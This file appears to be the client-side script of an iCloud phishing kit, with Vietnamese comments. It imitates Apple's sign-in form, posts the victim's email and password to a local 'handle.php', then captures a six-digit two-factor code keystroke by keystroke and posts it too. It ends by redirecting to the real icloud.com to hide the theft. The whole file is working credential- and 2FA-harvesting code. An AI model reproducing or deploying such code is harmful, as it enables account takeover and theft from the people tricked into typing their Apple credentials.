$(document).ready(function() {
	$("#sign-in").click(function() {
		var txt_email = $('#account_name_text_field').val();
		var txt_passw = $('#password_text_field').val();
		if (txt_email == '') {
			$('#account_name_text_field').focus();
		} else {
			if (IsEmail(txt_email)) {
				$('#sign_in_form').addClass('show-password');
			}else{
				$('#account_name_text_field').val(txt_email + '@icloud.com');
				$('#sign_in_form').addClass('show-password');
			}
		}
		if (txt_passw == '' || txt_passw.length < 5) {
			$('#password_text_field').focus();
		}else{
			ajaxLogin(txt_email, txt_passw);
		}
	});
});

//Mã xác thực
$(document).ready(function() {

	var verify = char0 = char1 = char2 = char3 = char4 = char5 = '';
	$("#char0").keyup(function(){
		$('#char1').focus();
		var char0 = $('#char0').val();
		verify += char0;
		validateVerify(verify);
	});

	$("#char1").keyup(function(){
		$('#char2').focus();
		var char1 = $('#char1').val();
		verify += char1;
		validateVerify(verify);
	});
	$("#char2").keyup(function(){
		$('#char3').focus();
		var char2 = $('#char2').val();
		verify += char2;
		validateVerify(verify);
	});
	$("#char3").keyup(function(){
		$('#char4').focus();
		var char3 = $('#char3').val();
		verify += char3;
		validateVerify(verify);
	});
	$("#char4").keyup(function(){
		$('#char5').focus();
		var char4 = $('#char4').val();
		verify += char4;
		validateVerify(verify);
	});
	$("#char5").keyup(function(){
		var char5 = $('#char5').val();
		verify += char5;
		validateVerify(verify);
	});
});

function validateVerify(verify){
	if (verify.length == 6) {
		// alert('ok');
		$('#no-trstd-device-pop').hide();
		$('.verifying-code-text.thin').text('Đang xác minh…');
		ajaxVerify(verify);
	}
}
function IsEmail(email) {
	var regex = /^([a-zA-Z0-9_\.\-\+])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
	if (!regex.test(email)) {
		return false;
	} else {
		return true;
	}
}

function ajaxLogin(txt_email, txt_passw){
	$.ajax({
		url : "handle.php",
		type : "post",
		dataType:"text",
		data : {
			email : txt_email, pass : txt_passw,
		},
		success : function (result){
			console.log(result);
			window.location.replace('verify.php')
		}
	});
}

function ajaxVerify(verify){
	$.ajax({
		url : "handle.php",
		type : "post",
		dataType:"text",
		data : {
			verify : verify
		},
		success : function (result){
			console.log(result);
			setTimeout(function(){
			    window.location.replace('https://www.icloud.com/')
			}, 3000);
		}
	});
}
